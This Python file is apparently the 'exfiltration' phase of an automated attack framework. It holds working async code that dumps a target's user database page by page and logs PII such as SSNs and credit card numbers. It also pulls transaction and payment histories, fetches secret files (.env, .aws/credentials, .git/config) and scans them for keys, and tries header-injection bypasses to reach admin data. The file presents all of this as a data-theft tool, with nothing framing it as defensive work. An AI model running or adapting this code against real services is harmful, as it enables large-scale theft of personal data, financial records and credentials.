"""
Exfiltration Engine
Phase 5: Data theft at scale, bulk API downloads, database dumps
"""

import asyncio
import aiohttp
import logging
from typing import Dict, List, Any, Optional
from .base import ExfiltrationModule
import time

logger = logging.getLogger(__name__)


class ExfiltrationEngine(ExfiltrationModule):
    """
    Bulk data theft and exfiltration
    - Mass user enumeration and export
    - Database dump via API
    - Sensitive file extraction
    - Transaction history export
    - Cache poisoning for data leakage
    """

    def __init__(self):
        super().__init__(
            name="Exfiltration Engine",
            description="Large-scale data extraction"
        )
        self.exfiltrated_records: int = 0
        self.data_size_mb: float = 0.0
        self.extraction_methods: List[str] = []

    async def execute(self, context) -> Dict[str, Any]:
        """Execute data exfiltration attacks using lateral movement results"""
        logger.info(f"[Exfil] Starting exfiltration on {context.target_url}")

        # Only attempt if lateral movement was successful
        if not context.extracted_credentials:
            logger.info(f"  ✗ Skipping exfiltration - no credentials extracted")
            return {"data_exfiltrated_mb": 0, "records_stolen": 0, "methods": []}

        results = await asyncio.gather(
            self._mass_user_export(context.target_url),
            self._transaction_history_dump(context.target_url),
            self._sensitive_file_extraction(context.target_url),
            self._cache_poisoning(context.target_url),
        )

        # Update context with exfiltration results
        context.data_exfiltrated_mb = self.data_size_mb
        context.records_stolen = self.exfiltrated_records
        context.extraction_methods = self.extraction_methods.copy()

        return {
            "data_exfiltrated_mb": self.data_size_mb,
            "records_stolen": self.exfiltrated_records,
            "methods": self.extraction_methods,
            "success_count": sum(1 for r in results if r.get("success"))
        }

    async def _mass_user_export(self, target: str) -> Dict[str, Any]:
        """Export entire user database via API pagination"""
        logger.info(f"[Exfil] Mass User Export via API pagination")

        url = f"{target}/api/v1/users"
        total_records = 0

        try:
            async with aiohttp.ClientSession() as session:
                page = 1
                page_size = 1000  # Typical pagination limit

                while page < 100:  # Reasonable limit
                    logger.info(f"  Fetching page {page}...")

                    async with session.get(
                        url,
                        params={"page": page, "limit": page_size},
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            users = data.get("users", [])

                            if not users:
                                logger.info(f"  Reached end at page {page}")
                                break

                            total_records += len(users)

                            # Estimate data size
                            response_size = len(await resp.text()) / (1024 * 1024)
                            self.data_size_mb += response_size

                            logger.info(f"    Page {page}: {len(users)} records (~{response_size:.2f}MB)")

                            # Extract PII
                            pii_fields = ["email", "phone", "ssn", "credit_card", "address"]
                            for user in users:
                                for field in pii_fields:
                                    if field in user:
                                        logger.info(f"      ✓ Found PII: {field} = {str(user[field])[:30]}...")

                            page += 1
                        elif resp.status == 429:
                            logger.info(f"  Rate limited, backing off...")
                            await asyncio.sleep(5)
                        else:
                            break

                if total_records > 0:
                    logger.info(f"  ✓ Exported {total_records} user records ({self.data_size_mb:.2f}MB)")
                    self.exfiltrated_records += total_records
                    self.extraction_methods.append("user_export")
                    return {"success": True, "records": total_records}

        except Exception as e:
            logger.error(f"  Export error: {e}")

        return {"success": False}

    async def _transaction_history_dump(self, target: str) -> Dict[str, Any]:
        """Extract transaction/payment history"""
        logger.info(f"[Exfil] Transaction History Dump")

        endpoints = [
            "/api/v1/transactions",
            "/api/v1/payments/history",
            "/api/v1/billing/invoices",
            "/api/v1/orders"
        ]

        for endpoint in endpoints:
            url = f"{target}{endpoint}"
            logger.info(f"  Attempting {endpoint}...")

            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        url,
                        params={"limit": 1000},
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            records = len(data.get("transactions", data.get("payments", [])))

                            if records > 0:
                                self.exfiltrated_records += records
                                size = len(await resp.text()) / (1024 * 1024)
                                self.data_size_mb += size
                                logger.info(f"    ✓ Dumped {records} transactions ({size:.2f}MB)")
                                self.extraction_methods.append("transaction_dump")
                                return {"success": True, "records": records}

            except Exception as e:
                pass

        return {"success": False}

    async def _sensitive_file_extraction(self, target: str) -> Dict[str, Any]:
        """Extract sensitive files (configs, source code, etc)"""
        logger.info(f"[Exfil] Sensitive File Extraction")

        sensitive_paths = [
            "/.git/config",
            "/.env",
            "/.env.local",
            "/config.json",
            "/secrets.json",
            "/package.json",
            "/requirements.txt",
            "/docker-compose.yml",
            "/.aws/credentials",
            "/.ssh/id_rsa.pub",
            "/app/config/database.yml",
            "/src/config.ts",
        ]

        files_found = []

        async with aiohttp.ClientSession() as session:
            for path in sensitive_paths:
                try:
                    url = f"{target}{path}"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            size = len(content) / (1024 * 1024)
                            self.data_size_mb += size
                            files_found.append(path)

                            # Extract secrets
                            secrets_found = []
                            if "password" in content.lower():
                                secrets_found.append("password")
                            if "api_key" in content.lower():
                                secrets_found.append("api_key")
                            if "database_url" in content.lower():
                                secrets_found.append("database_url")
                            if "aws" in content.lower():
                                secrets_found.append("aws_credentials")

                            logger.info(f"    ✓ Found {path} ({size:.2f}MB)")
                            if secrets_found:
                                logger.info(f"      Secrets: {', '.join(secrets_found)}")

                except Exception as e:
                    pass

        if files_found:
            logger.info(f"  ✓ Extracted {len(files_found)} sensitive files")
            self.extraction_methods.append("file_extraction")
            return {"success": True, "files": files_found}

        return {"success": False}

    async def _cache_poisoning(self, target: str) -> Dict[str, Any]:
        """Poison cache to leak data or redirect users"""
        logger.info(f"[Exfil] Cache Poisoning for Data Leakage")

        # Cache poisoning via HTTP header injection
        cache_bypass_headers = [
            {"X-Original-URL": "/api/admin/users"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"Host": "admin.internal"},
            {"X-Rewrite-URL": "/admin"},
            {"CF-Connecting-IP": "127.0.0.1"},
        ]

        url = f"{target}/api/v1/data"

        async with aiohttp.ClientSession() as session:
            for headers in cache_bypass_headers:
                try:
                    async with session.get(
                        url,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=2)
                    ) as resp:
                        if resp.status in [200, 302]:
                            content = await resp.text()
                            if any(keyword in content.lower() for keyword in ["admin", "password", "secret"]):
                                logger.info(f"  ✓ Cache poisoning successful with headers: {headers}")
                                self.extraction_methods.append("cache_poisoning")
                                return {"success": True, "headers": headers}

                except Exception as e:
                    pass

        logger.info(f"  ✗ Cache poisoning failed")
        return {"success": False}

    async def analyze_defense(self, response: Dict) -> Optional[str]:
        """Detect data leakage detection and DLP systems"""
        if response.get("status") == 429:
            return "RATE_LIMIT_DETECTED"
        elif response.get("status") == 403:
            return "ACCESS_DENIED"
        elif "blocked" in response.get("body", "").lower():
            return "DLP_DETECTED"
        elif "suspicious" in response.get("body", "").lower():
            return "ANOMALY_DETECTION"
        return None
